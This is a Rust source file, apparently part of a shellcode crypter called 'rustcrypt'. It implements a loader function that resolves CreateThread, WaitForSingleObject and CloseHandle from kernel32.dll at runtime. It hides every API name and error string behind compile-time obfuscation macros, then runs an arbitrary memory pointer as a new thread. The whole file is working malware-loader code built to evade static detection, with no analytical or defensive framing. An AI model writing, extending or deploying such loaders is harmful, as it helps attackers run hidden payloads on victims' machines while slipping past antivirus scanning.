/// CreateThread + WaitForSingleObject 方式
#[cfg(feature = "run_create_thread")]
use std::ffi::c_void;
#[cfg(feature = "run_create_thread")]
pub unsafe fn run_create_thread(p: *mut c_void) -> Result<(), String> {
    use std::ptr::null_mut;
    use rustcrypt_ct_macros::obf_lit_bytes;
    use rustcrypt_ct_macros::obf_lit;
    use windows_sys::Win32::System::LibraryLoader::{GetProcAddress, LoadLibraryA};
    use std::mem::transmute;
    let kernel32 = LoadLibraryA(obf_lit_bytes!(b"kernel32.dll\0").as_ptr());
    if kernel32 == 0 {
        return Err(obf_lit!("Failed to load kernel32.dll").to_string());
    }
    let p_create_thread = GetProcAddress(kernel32, obf_lit_bytes!(b"CreateThread\0").as_ptr());
    if p_create_thread.is_none() {
        return Err(obf_lit!("Failed to resolve CreateThread").to_string());
    }
    type CreateThreadFn = unsafe extern "system" fn(
        lp_thread_attributes: *mut c_void,
        dw_stack_size: usize,
        lp_start_address: Option<unsafe extern "system" fn(*mut c_void) -> u32>,
        lp_parameter: *mut c_void,
        dw_creation_flags: u32,
        lp_thread_id: *mut c_void,
    ) -> *mut c_void;
    let create_thread: CreateThreadFn = transmute(p_create_thread.unwrap());
    let p_wait = GetProcAddress(kernel32, obf_lit_bytes!(b"WaitForSingleObject\0").as_ptr());
    if p_wait.is_none() {
        return Err(obf_lit!("Failed to resolve WaitForSingleObject").to_string());
    }
    type WaitForSingleObjectFn = unsafe extern "system" fn(*mut c_void, u32) -> u32;
    let wait_for_single_object: WaitForSingleObjectFn = transmute(p_wait.unwrap());
    let p_close = GetProcAddress(kernel32, obf_lit_bytes!(b"CloseHandle\0").as_ptr());
    if p_close.is_none() {
        return Err(obf_lit!("Failed to resolve CloseHandle").to_string());
    }
    type CloseHandleFn = unsafe extern "system" fn(*mut c_void) -> i32;
    let close_handle: CloseHandleFn = transmute(p_close.unwrap());
    const INFINITE: u32 = 0xFFFFFFFF;
    let thread_fn: unsafe extern "system" fn(*mut c_void) -> u32 = transmute(p);
    let h = create_thread(
        null_mut(),
        0,
        Some(thread_fn),
        p,
        0,
        null_mut(),
    );
    if h.is_null() {
        return Err(obf_lit!("CreateThread failed").to_string());
    }
    wait_for_single_object(h, INFINITE);
    close_handle(h);
    Ok(())
}